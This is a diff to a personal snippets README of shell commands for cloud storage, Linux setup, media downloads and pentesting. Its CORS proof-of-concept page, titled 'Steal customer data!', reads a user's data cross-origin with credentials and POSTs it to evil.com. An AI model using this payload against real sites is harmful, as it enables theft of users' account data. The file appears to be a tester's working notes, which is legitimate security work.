@@ -6,6 +6,45 @@ A github repo maintaining mostly (python) code snippets and commands which I use
 
 ## Code Snippets
 
+### Pentesting
+
+#### POC for C0RS
+
+```html
+<!DOCTYPE html>
+<html>
+    <body>
+        <center>
+            <h3>Steal customer data!</h3>
+            <button type='button' onclick='cors()'>Exploit</button>
+            <p id='demo'></p>
+            <script>
+                function cors() {
+                    var xhttp = new XMLHttpRequest();
+                    xhttp.onreadystatechange = function() {
+                        if (this.readyState == 4 && this.status == 200) {
+                            var a = this.responseText; // Sensitive data from subdomain.site.com about user account
+                            document.getElementById("demo").innerHTML = a;
+                            
+                            xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
+                            xhttp.withCredentials = true;
+                            
+                            console.log(a);
+                            xhttp.send("data=" a);
+                        }
+                    }
+                    xhttp.open("GET", "https://subdomain.site.com/data-endpoint", true);
+                    xhttp.withCredentials = true;
+                    xhttp.send();
+                }
+            </script>
+        </center>
+    </body>
+</html>
+```
+
+
+
 ### BurpSuite
 
 #### Bruteforce wordlist using Turbo Intruder and write results in file
@@ -796,6 +835,29 @@ curl -v -i -s -k -X $'POST' \
 
 ## Command Snippets
 
+
+### Pentesting
+
+#### Using nuclei all templates against a list containing urls
+
+```powershell
+cat urls.txt | nuclei -t cves -t vulnerabilities -t technologies -t workflows -t dns -t generic-detections -t subdomain-takeover -t wordlists -t panels -t files -t security-misconfiguration -t tokens -t fuzzing -t default-credentials -t payloads -t misc
+```
+
+
+#### SonarQube - CLI Scan
+
+Scans the current folder `.`
+
+```powershell
+sonar-scanner \
+  -Dsonar.projectKey=PentestProject \
+  -Dsonar.sources=. \
+  -Dsonar.host.url=http://192.168.xxx.xxx:9000 \
+  -Dsonar.login=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+```
+
+
 ### iOS
 
 #### Find all the .plists in the local directory and write into one
@@ -808,6 +870,18 @@ for files in $(find . -name '*.plist'); do
 	plistutil -i $files  >> plists.xml
 done
 ```
+
+
+### Development
+
+#### Creating and uploading package on PyPi
+
+```powershell
+python3 setup.py sdist bdist_wheel
+twine check dist/*
+twine upload dist/*
+```
+
 
 
 
@@ -832,6 +906,39 @@ sudo apt-get -y update && \
 ```bash
 crunch 4 5 -f /usr/share/crunch/charset.lst mixalpha-numeric -o charlist.txt
 ```
+
+
+
+#### Install XRDP + XFCE in Ubuntu 18.04 instance
+
+```powershell
+sudo apt-get update
+sudo apt-get install xfce4 xfce4-terminal
+sudo apt-get install xrdp
+sudo systemctl enable xrdp
+sudo sed -i.bak '/fi/a #xrdp multiple users configuration n xfce-session n' /etc/xrdp/startwm.sh
+sudo /etc/init.d/xrdp restart
+```
+
+
+#### Pop OS! - Initial setup tools 
+
+```powershell
+sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor
+
+sudo apt install plank gdebi tmux figlet toilet htop google-chrome-stable chromium-browser gnome-tweaks mpv flameshot peek deluge deluge-gtk aria2 vlc python3-venv virtualenv nmap php-cli python python3 python3-pip network-manager openvpn kazam remmina netdiscover openjdk-8-jdk openjdk-8-jre rar unrar gdb traceroute apt-transport-https indicator-netspeed-unity indicator-sysmonitor upx
+```
+
+
+
+#### Fixing NTFS mounting or other shits or error on hdd/ssd:
+
+```powershell
+sudo ntfsfix /dev/nvme0n1p4
+```
+
+
+
 
 
 
@@ -967,6 +1074,136 @@ sudo apt update && \
 
 
 
+#### ZSH functions for starting and shutting down CS:GO Server
+
+```powershell
+startCsgoServer() {
+    aws ec2 start-instances --instance-ids i-045e932beb160a0b6 --profile csgo-server
+    sleep 20
+    bash /home/umar_0x01/ec2/csgo-server.sh "pwd; tmux new -d -s bruh; tmux send-keys -t bruh.0 'bash startcsgo.sh' ENTER"
+}
+
+stopCSGOServer() {
+    bash /home/umar_0x01/ec2/csgo-server.sh "pwd; tmux send-keys -t bruh.0 'exit' ENTER"
+    sleep 3
+    aws ec2 stop-instances --instance-ids i-045e932beb160a0b6 --profile csgo-server
+}
+```
+
+
+#### Turning Debian Instance on Kali
+
+```powershell
+sudo apt-get -y update && \
+    sudo apt-get install -y dirmngr --install-recommends && \
+    echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" | sudo tee /etc/apt/sources.list && \
+    sudo apt-key adv --keyserver hkp://keys.gnupg.net:80 --recv-keys ED444FF07D8D0BF6 && \
+    sudo apt-get -y update && \
+    sudo apt-get install -y python3 && \
+    sudo apt-get -y upgrade && \
+    sudo apt-get -y install kali-linux-default
+```
+
+
+
+#### Speeding up AWS S3 bucket downloading
+
+```powershell
+aws configure set default.s3.max_concurrent_requests 50
+aws s3 cp s3://my-bucket . --recursive --endpoint-url=https://s3.wasabisys.com --no-sign-request
+aws s3 cp "s3://my-bucket/my-data/" . --recursive --endpoint-url=https://s3.wasabisys.com
+```
+
+
+#### Using s4cmd for syncing s3 bucket
+
+```powershell
+s4cmd --endpoint-url https://s3.wasabisys.com sync s3://my-bucket/my-folder . 
+```
+
+
+
+#### Uploading files on Wasabi
+
+```powershell
+aws s3 cp file.jar s3://bucket/ --endpoint-url=https://s3.wasabisys.com --no-sign-request
+aws s3 cp mfolder/ s3://bucket/ --endpoint-url=https://s3.wasabisys.com --recursive --no-sign-request
+```
+
+
+
+#### Wasabi - Region based BS resolution
+
+```powershell
+aws s3 ls --endpoint-url=https://s3.ap-southeast-2.wasabisys.com s3://bucket/
+```
+
+
+
+#### Installing ffmpeg in heroku application
+
+```powershell
+heroku buildpacks:add --index 1 https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest.git
+```
+
+
+
+### Downloading/Uploading Stuff
+
+#### Downloading folder using gdl / googledrive downloader / google drive downloader
+
+```powershell
+gdl --oauth -p 50 -R 10 -aria --aria-flags '-s 10 -j 10 -x 16' https://drive.google.com/drive/u/3/folders/folder_id
+gdl -p 50 -R 10 -aria --aria-flags '-s 10 -j 10 -x 16' https://drive.google.com/file/d/folder_id/view
+```
+
+
+
+#### Uploading using gdl
+
+```powershell
+gupload files/ -p 10 -R 5 -v
+```
+
+
+
+#### Uploading using rclone
+
+```powershell
+./rclone copy --update --verbose --transfers 10 --checkers 4 --contimeout 60s --timeout 300s --retries 3 --low-level-retries 10 --stats 5s "ine" "gdrive:my-folder" --ignore-existing
+```
+
+
+
+#### Multiple URLs download using youtube-dl and xargs
+
+```powershell
+cat files.txt | xargs -n 1 -P 4 youtube-dl
+```
+
+
+#### Downloading videos from teachable.io / teachable / tcm / tcmacademy
+
+```powershell
+# academy.tcm-sec.com
+youtube-dl --cookies ~/cookies.txt -o "./%(chapter_number)02d - %(chapter)s/%(autonumber)03d-%(title)s.mp4" https://academy.tcm-sec.com/courses/enrolled/1221729 --external-downloader "aria2c" --external-downloader-args "-s 10 -j 10 -x 16 --file-allocation=none -c" -c
+
+# pluralsight - this can block account
+youtube-dl --cookies ~/Downloads/pluralsight.com_cookies.txt -o "%(playlist)s/%(chapter_number)02d - %(chapter)s/%(playlist_index)02d - %(title)s.%(ext)s" --min-sleep-interval 150 --max-sleep-interval 300 --sub-lang en --sub-format srt --write-sub -vvv https://app.pluralsight.com/library/courses/csslp-secure-software-design/
+```
+
+
+#### Youtube-dl downloading youtube channel playlist with aria2c
+
+```powershell
+youtube-dl -o "./%(autonumber)03d-%(title)s.mp4" --external-downloader "aria2c" --external-downloader-args "-s 10 -j 10 -x 16 --file-allocation=none -c" -c -f mp4 https://www.youtube.com/playlist?list=playlist_id
+```
+
+
+
+
+
+
 ### Windows
 
 #### Cleaning WSL2 storage after deletion of files (Home edition)
@@ -985,37 +1222,15 @@ exit
 
 
 
-#### POC for C0RS
+### Generic Commands
 
-```html
-<!DOCTYPE html>
-<html>
-    <body>
-        <center>
-        <h3>Steal customer data!</h3>
-        <html>
-            <body>
-                <button type='button' onclick='cors()'>Exploit</button>
-                <p id='demo'></p>
-                <script>
-                    function cors() {
-                    var xhttp = new XMLHttpRequest();
-                    xhttp.onreadystatechange = function() {
-                    if (this.readyState == 4 && this.status == 200) {
-                    var a = this.responseText; // Sensitive data from subdomain.site.com about user account
-                    document.getElementById("demo").innerHTML = a;
-                    xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
-                    xhttp.withCredentials = true;
-                    console.log(a);
-                    xhttp.send("data=" a);
-                    }
-                    };
-                    xhttp.open("GET", "https://subdomain.site.com/data-endpoint", true);
-                    xhttp.withCredentials = true;
-                    xhttp.send();
-                    }
-                </script>
-            </body>
-        </html>
+#### ffmpeg
+
+```powershell
+# Using ffmpeg to lessen the filesize of a video
+ffmpeg -i poc.mp4 -vcodec libx264 -x264-params keyint=300:scenecut=0 out4.mp4
+
+
+# For decreasing the total frames
+ffmpeg -i poc.mp4 -vcodec libx264 -x264-params keyint=300:scenecut=0 -filter:v fps=fps=10 out3.mp4
 ```
-
